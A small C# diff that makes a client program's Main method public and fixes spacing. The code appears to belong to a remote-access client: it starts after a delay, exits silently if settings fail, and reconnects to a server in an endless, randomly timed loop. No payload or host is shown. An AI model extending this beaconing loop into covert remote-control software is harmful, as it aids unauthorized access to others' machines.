@@ -14,11 +14,9 @@ using Client.Helper;
 
 namespace Client
 {
-    class Program
+    public class Program
     {
-
-
-        static void Main()
+        public static void Main()
         {
             Thread.Sleep(2500);
             if (!Settings.InitializeSettings()) Environment.Exit(0);
@@ -48,7 +46,7 @@ namespace Client
                     ClientSocket.Reconnect();
                     ClientSocket.InitializeClient();
                 }
-                Thread.Sleep(new Random().Next(1000,5000));
+                Thread.Sleep(new Random().Next(1000, 5000));
             }
         }
     }
